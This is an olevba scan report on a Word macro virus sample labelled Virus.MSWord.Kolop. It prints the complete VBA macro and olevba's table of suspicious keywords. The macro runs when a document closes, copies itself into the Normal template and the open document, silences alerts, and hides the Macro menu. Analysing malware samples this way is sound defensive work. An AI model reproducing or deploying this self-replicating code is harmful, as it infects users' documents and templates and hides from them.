olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kolop
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kolop - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Kolopatia
Private Sub Document_Close(): d = d + 1
ShowVisualBasicEditor = False: Application.DisplayAlerts = wdAlertsNone
vLin = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents(d).CodeModule.CountOfLines)

If NormalTemplate.VBProject.VBComponents(d).CodeModule.Lines(d, d) <> "'Kolopatia" Then

    With NormalTemplate.VBProject.VBComponents(d).CodeModule

        .DeleteLines d, .CountOfLines: .AddFromString vLin

    End With

End If

If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(d, d) <> "'Kolopatia" Then

    With ActiveDocument.VBProject.VBComponents(d).CodeModule

        .DeleteLines d, .CountOfLines: .AddFromString vLin

    End With

End If

ActiveDocument.SaveAs ActiveDocument.FullName
NormalTemplate.Save

If Day(Now()) = 7 Then
 
    With Application

        .Caption = Application.UserName

        With .Assistant
    
            .Animation = msoAnimationGreeting
    
        End With
     
    End With

End If

CommandBars("Tools").Controls("Macro").Visible = False

End Sub
'Kolopatia by e[ax]
'Authorized Distribution for Bosnia and Herzegovina







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

